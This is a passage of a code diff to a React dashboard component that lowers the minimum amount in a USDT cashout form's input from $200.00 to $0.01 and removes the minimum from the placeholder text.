               className="space-y-4"
               id="usdt-cashout-form"
@@ -2191,9 +2281,9 @@ export default function Dashboard({
                       id="cashout-usdt-amount"
                       type="number"
                       step="0.01"
-                      min="200.00"
+                      min="0.01"
                       required
-                      placeholder={`Min: $200.00 | Max: $${user.balance.toFixed(2)}`}
+                      placeholder={`Max: $${user.balance.toFixed(2)}`}
                       className="w-full pl-8 pr-4 py-3 bg-[#181F2E] border border-slate-700/80 rounded-2xl text-sm font-semibold focus:outline-none focus:border-blue-500 text-white placeholder-slate-500"
                       value={cashoutUSDTAmount}
                       onChange={(e) => setCashoutUSDTAmount(e.target.value)}
